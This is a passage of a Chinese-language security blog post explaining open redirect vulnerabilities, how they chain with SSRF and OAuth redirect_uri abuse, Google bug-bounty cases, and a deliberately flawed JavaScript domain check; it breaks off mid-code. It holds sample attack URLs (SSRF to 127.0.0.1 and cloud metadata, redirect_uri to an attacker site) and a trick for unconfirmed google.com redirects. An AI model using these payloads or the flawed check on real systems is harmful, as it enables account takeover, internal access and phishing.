&lt;p&gt;SSRF，全名為 Server-Side Request Forgery，通常翻作伺服器請求偽造，關於這個漏洞詳細的介紹跟攻擊未來可能再寫一篇跟大家介紹，我這邊先簡單講一下。&lt;/p&gt;
&lt;p&gt;通常在內部的 Server，都不會讓外部直接存取到，對外可能只會有一台 proxy 把 request forward 到對應的主機。假設有一個服務的伺服器架構如下圖所示，背後有一台 Back-end Server 會去呼叫隱藏在內網中的 PDF service 產生 PDF 檔案：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/huli/open-redirect/ssrf.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;而這個 PDF service 限制網址只能是 &lt;a href=&quot;https://example.com/&quot;&gt;https://example.com&lt;/a&gt; 開頭，避免有人傳入其他網址進來。這時如果某個 URL 有 open redirect 的漏洞，攻擊者就可以傳入：&lt;code&gt;https://example.com?redirect=http://127.0.0.1&lt;/code&gt;，讓 PDF service 去造訪這個網址，而被轉址到 127.0.0.1，並且回傳它的內容。&lt;/p&gt;
&lt;p&gt;這樣就叫做 SSRF，你透過內部的服務，成功發了一個 request 到外網進不去的 service，如此一來你就可以去看看內網還有什麼其他服務存在，例如說 Redis 或是 MySQL 等等，這些直接從外網都進不去，但透過 SSRF 就可以。或更簡單的方式是去看一些 cloud 相關的檔案，有些 cloud 服務只要存取 &lt;a href=&quot;http://169.254.169.254/&quot;&gt;http://169.254.169.254&lt;/a&gt; 就會看到一些 metadata，有興趣可以看這邊：&lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#exploitation-in-cloud&quot;&gt;Abusing SSRF in AWS EC2 environment&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;所以透過 open redirect，可以繞過原本有做網址檢查的地方。&lt;/p&gt;
&lt;p&gt;第二個會碰到的問題則是跟 OAuth 有關，在 OAuth 的流程中通常都會有一個 redirect_uri，接收授權完畢之後的一個 code，以 Facebook 為例的話是長這樣：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://www.facebook.com/v11.0/dialog/oauth?
  client_id={app-id}
  &amp;amp;redirect_uri={&amp;quot;https://example.com/login&amp;quot;}
  &amp;amp;state={&amp;quot;{st=state123abc,ds=123456789}&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用者點擊網址後會跳到 Facebook，按下授權就會被導到 &lt;a href=&quot;https://example.com/login&quot;&gt;https://example.com/login&lt;/a&gt; 並且可以在網址中拿到 code 或是 token，接著就可以用這個搭配 client id 跟 client secret，拿到 auth token，並且用這個 auth token 代表使用者去跟 Facebook 拿取資料。&lt;/p&gt;
&lt;p&gt;如果 redirect_uri 的保護沒有做好，攻擊者就可以把它換成其他值，例如說：&lt;code&gt;redirect_uri=https://huli.tw&lt;/code&gt;，這樣使用者點擊授權以後，就會把驗證用的 code 傳到我的網站，而不是預期中的網站。&lt;/p&gt;
&lt;p&gt;但一般來說 redirect_uri 都會限制 domain，所以沒那麼簡單就可以繞過。這時候就要請出 open redirect 登場了，如果網站有這個漏洞的話，就可以這樣：&lt;code&gt;redirect_uri=https://example.com?redirect=https://huli.tw&lt;/code&gt;，如此一來就算符合 domain 限制，最後導向的地方依然是個外部網站，攻擊者一樣可以偷到驗證用的 code。&lt;/p&gt;
&lt;p&gt;所以為了避免這類型的攻擊，Facebook 或 Google 這種大型服務在設置 App 的時候都會加強限制，redirect_uri 通常都會要求寫死，不讓你設置 wildcard，例如說我填 &lt;code&gt;https://example.com/auth&lt;/code&gt;，就是真的只有這個網址可以過，其他不同 path 的網址都會失敗。但有些小公司沒有注意到這麼細，對於 redirect_uri 就沒有這麼多規範。&lt;/p&gt;
&lt;p&gt;像是這種 OAuth 結合 open redirect 達成 account takeover（帳號奪取）的例子其實不少，例如說這個：&lt;a href=&quot;https://hackerone.com/reports/905607&quot;&gt;[cs.money] Open Redirect Leads to Account Takeover&lt;/a&gt;，或是 GitHub 其實也有過這類型的漏洞：&lt;a href=&quot;https://devcraft.io/2020/10/19/github-gist-account-takeover.html&quot;&gt;GitHub Gist - Account takeover via open redirect - $10,000 Bounty&lt;/a&gt;，而這個 Airbnb 的漏洞也很精彩：&lt;a href=&quot;https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/&quot;&gt;Authentication bypass on Airbnb via OAuth tokens theft&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;總結一下，open redirect 的用處除了讓使用者放鬆戒心來進行釣魚以外，另一個就是繞過有針對 domain 進行檢查的地方。上面講的 SSRF 跟 OAuth 這兩個漏洞之所以能跟它結合，就是因為可以用 open redirect 來繞過對 domain 的檢查。&lt;/p&gt;
&lt;h2 id=&quot;%E9%82%A3%E8%A9%B2%E6%80%8E%E9%BA%BC%E9%98%B2%E7%A6%A6-open-redirect%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%82%A3%E8%A9%B2%E6%80%8E%E9%BA%BC%E9%98%B2%E7%A6%A6-open-redirect%EF%BC%9F&quot;&gt;#&lt;/a&gt; 那該怎麼防禦 open redirect？&lt;/h2&gt;
&lt;p&gt;如果想防止 open redirect，可想而知就是要對重新導向的網址進行檢查。這聽起來簡單，實作起來卻容易出現漏洞，例如說底下的例子是一段檢查 domain 的程式碼，根據取出的 hostname 比對是否含有 &lt;code&gt;cymetrics.io&lt;/code&gt;，有的話就通過，目的是只有 &lt;a href=&quot;http://cymetrics.io/&quot;&gt;cymetrics.io&lt;/a&gt; 跟它的 subdomain 可以通過：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; validDomain &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;cymetrics.io&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;validateDomain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; host &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;hostname &lt;span class=&quot;token comment&quot;&gt;// 取出 hostname&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; host&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;includes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;validDomain&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;validateDomain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;https://example.com&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;validateDomain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;https://cymetrics.io&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// true&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;validateDomain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;https://dev.cymetrics.io&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// true&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;感覺好像沒什麼問題？除了 &lt;code&gt;cymetrics.io&lt;/code&gt; 或是它的 subdomain 以外，應該不會有其他網域可以通過這檢查吧？&lt;/p&gt;
&lt;p&gt;雖然看似如此，但其實有兩個方式可以繞過。這邊先假設 URL parsing 的方式不會有問題，一定會拿到 hostname，所以 &lt;code&gt;attacker.com?q=cymetrics.io&lt;/code&gt; 這種方式是沒用的，hostname 會拿到 &lt;code&gt;attacker.com&lt;/code&gt; 而已。&lt;/p&gt;
&lt;p&gt;大家可以想一下有哪兩種可以繞過，在公佈答案之前，先來看下一個段落。&lt;/p&gt;
&lt;h2 id=&quot;google-%E5%B0%8D%E6%96%BC-open-redirect-%E7%9A%84%E7%9C%8B%E6%B3%95&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#google-%E5%B0%8D%E6%96%BC-open-redirect-%E7%9A%84%E7%9C%8B%E6%B3%95&quot;&gt;#&lt;/a&gt; Google 對於 open redirect 的看法&lt;/h2&gt;
&lt;p&gt;Google 在官方網站 &lt;a href=&quot;https://sites.google.com/site/bughunteruniversity/nonvuln/open-redirect&quot;&gt;Bughunter University&lt;/a&gt; 當中有明確提到一般的 open redirect 不會被視為安全性上的漏洞，除非能證明它可以跟其他漏洞結合在一起使用。&lt;/p&gt;
&lt;p&gt;那是不是有人成功過呢？當然，底下我舉兩個例子。&lt;/p&gt;
&lt;p&gt;第一個例子來自這篇文章：&lt;a href=&quot;https://blog.bentkowski.info/2018/07/vulnerability-in-hangouts-chat-aka-how.html&quot;&gt;Vulnerability in Hangouts Chat: from open redirect to code execution&lt;/a&gt;，對象是 Google Hangouts Chat 的 Electron App。&lt;/p&gt;
&lt;p&gt;在那個 App 裡面如果網址是 &lt;code&gt;https://chat.google.com&lt;/code&gt; 開頭的話，點擊網址就會直接在 Electron 裡面開啟網頁，而不是用瀏覽器去開。因此只要找到 &lt;code&gt;https://chat.google.com&lt;/code&gt; 的 open redirect，就可以把使用者導去釣魚網站。而 Electron App 跟瀏覽器的差異之一就在於 Electron App 預設是不會有網址列的，所以使用者根本無從辨別這是不是釣魚網站。詳細的流程跟最後的 payload 可以參考原文，這個漏洞還可以進一步提升成 RCE（不過我不知道是怎麼做的就是了），價值 7500 USD。&lt;/p&gt;
&lt;p&gt;第二個例子來自官方的文章：&lt;a href=&quot;https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter&quot;&gt;Open redirects that matter&lt;/a&gt;，這個案例也是超帥。&lt;/p&gt;
&lt;p&gt;在 Google I/O 2015 的網站中有個功能是去抓 Picasa 的資料回來並 render 成 JSON，但因為有跨網域的問題，因此後端寫了一個簡單的 proxy 去拿資料，像這樣：&lt;code&gt;/api/v1/photoproxy?url=to&lt;/code&gt;，而這個 proxy 會檢查 url 的開頭是否為 &lt;code&gt;https://picasaweb.google.com/data/feed/api&lt;/code&gt;，如果不是的話就回傳錯誤。&lt;/p&gt;
&lt;p&gt;所以作者的第一個目標就是找到 picasa 上的 open redirect，他最後找到的是這個網址：&lt;code&gt;https://picasaweb.google.com/bye?continue=&lt;/code&gt;，只要把這個網址改成：&lt;code&gt;https://picasaweb.google.com/data/feed/api/../../bye&lt;/code&gt;，就可以成功通過路徑的檢查，讓 server 認為這是一個合法的 URL。&lt;/p&gt;
&lt;p&gt;但這還沒結束，因為 bye?continue= 這個 redirect 也會檢查參數，continue 必須是 &lt;code&gt;https://google.com&lt;/code&gt; 開頭才可以。因此我們需要找到第二個 open redirect，這次是存在於 &lt;a href=&quot;http://google.com/&quot;&gt;google.com&lt;/a&gt; 上面。而 &lt;a href=&quot;http://google.com/&quot;&gt;google.com&lt;/a&gt; 有一個知名的 open redirect 是 AMP 用的，例如說 &lt;code&gt;https://www.google.com/amp/tech-blog.cymetrics.io&lt;/code&gt;，就會連到 &lt;a href=&quot;https://tech-blog.cymetrics.io/&quot;&gt;https://tech-blog.cymetrics.io&lt;/a&gt; （不過我剛嘗試了一下會先跳到中間頁，點擊確認後才會導向，應該是這功能有修正過了）。&lt;/p&gt;
&lt;p&gt;結合這兩個 open redirect，就可以讓 proxy 去抓取我們指定的 url 的內容：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://picasaweb.google.com/data/feed/api/../../../bye/?
continue=https%3A%2F%2Fwww.google.com%2Famp/
your-domain.example.com/path?querystring
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可是抓了之後只會輸出成 JSON，有什麼用呢？後端的程式碼如下：&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;servePhotosProxy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;w http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;ResponseWriter&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; r &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Request&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    c &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;newContext&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Method &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;GET&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token function&quot;&gt;writeJSONError&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; w&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;StatusBadRequest&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;invalid request method&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    url &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;FormValue&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;url&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;strings&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;HasPrefix&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;https://picasaweb.google.com/data/feed/api&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token function&quot;&gt;writeJSONError&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; w&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;StatusBadRequest&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;url parameter is missing or is an invalid endpoint&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    req&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;NewRequest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token function&quot;&gt;writeJSONError&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; w&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;errStatus&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;    res&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;httpClient&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Do&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;req&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token function&quot;&gt;writeJSONError&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; w&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;errStatus&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;defer&lt;/span&gt; res&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Body&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    w&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Header&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;application/json;charset=utf-8&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    w&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;WriteHeader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;res&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;StatusCode&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Copy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;w&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; res&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Body&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因為有設置 content type，所以沒辦法用 MIME sniffing 去攻擊。簡單解釋一下 MIME sniffing，當你的 response 沒有設置 content type 的時候，瀏覽器就會自動去猜這是什麼內容，如果裡面含有 HTML 的話，那就會被當成是 HTML 網站來解析並且渲染。&lt;/p&gt;
&lt;p&gt;而作者發現了另一個 bug，就是如果是 error 的話，並不會設置 content type，只有成功的時候會，所以可以故意回傳一個含有 HTML 的錯誤訊息，這樣被印在畫面時瀏覽器就會把這整份當成是 HTML，進而達成 XSS！詳細的流程跟介紹原文都寫得很清楚，很推薦大家去看一下原文。&lt;/p&gt;
&lt;p&gt;以上就是兩個在 Google 中曾經被發現的 open redirect 串聯其他漏洞引起的攻擊，兩個都很有趣！&lt;/p&gt;
&lt;p&gt;看完上面這些之後，我突然很好奇有哪些 Google 的 open redirect 是大家都知道的，於是我就 google 了：&lt;code&gt;known google open redirect&lt;/code&gt;，找到底下幾個網站：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://nakedsecurity.sophos.com/2020/05/15/how-scammers-abuse-google-searchs-open-redirect-feature/&quot;&gt;How scammers abuse Google Search’s open redirect feature&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.sean-wright.com/google-open-redirect/&quot;&gt;Google - Open Redirect&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.threatmark.com/google-bug-that-makes-your-bank-more-vulnerable-to-phishing/&quot;&gt;Google Bug that Makes Your Bank More Vulnerable to Phishing&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如果只是一般的 &lt;a href=&quot;https://www.google.com/url?q=http://tech-blog.cymetrics.io&quot;&gt;https://www.google.com/url?q=http://tech-blog.cymetrics.io&lt;/a&gt; 的話，點進去只會跳到確認頁面，但如果後面加一個參數 usg 的話，就可以不經過確認直接重新導向，不信你點點看這個，會去 &lt;a href=&quot;http://example.org/&quot;&gt;example.org&lt;/a&gt;：&lt;a href=&quot;https://www.google.com/url?sa=t&amp;amp;url=http://example.org/&amp;amp;usg=AOvVaw1YigBkNF7L7D2x2Fl532mA&quot;&gt;https://www.google.com/url?sa=t&amp;amp;url=http://example.org/&amp;amp;usg=AOvVaw1YigBkNF7L7D2x2Fl532mA&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;那這個 usg 是什麼呢？應該是網址經過某種 hash 過後的結果，但你不會知道怎麼算出來的。而要獲得這個 usg 其實也不難，你用 gmail 寄信給自己，信裡面要有你想導向的連結，接著再用 HTML basic view 來看，就會看到信中的連結變成了上面格式的重新導向！&lt;/p&gt;
&lt;p&gt;像是這個，就是我們部落格的重新導向連結：&lt;a href=&quot;https://www.google.com/url?q=https%3A%2F%2Ftech-blog.cymetrics.io&amp;amp;sa=D&amp;amp;sntz=1&amp;amp;usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug&quot;&gt;https://www.google.com/url?q=https%3A%2F%2Ftech-blog.cymetrics.io&amp;amp;sa=D&amp;amp;sntz=1&amp;amp;usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;實測之後發現真的能不經過確認就跳轉，這個功能好像已經存在滿久了，未來如果有需要 &lt;a href=&quot;http://google.com/&quot;&gt;google.com&lt;/a&gt; 的 open redirect 可以參考看看。&lt;/p&gt;
&lt;h2 id=&quot;%E6%AA%A2%E6%9F%A5-redirect-%E7%9A%84-domain&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%AA%A2%E6%9F%A5-redirect-%E7%9A%84-domain&quot;&gt;#&lt;/a&gt; 檢查 redirect 的 domain&lt;/h2&gt;
&lt;p&gt;好，接著講回剛剛問大家的兩種繞過方式，我再貼一次檢查 domain 的程式碼，讓大家回憶一下，接著就直接公布答案：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; validDomain &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;cymetrics.io&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;validateDomain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; host &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;hostname &lt;span class=&quot;token comment&quot;&gt;// 取出 hostname&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; host&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;includes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;validDomain&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;validateDomain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;https://example.com&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token function&quot;&gt;validateDomain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;https://cymetrics.io&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// 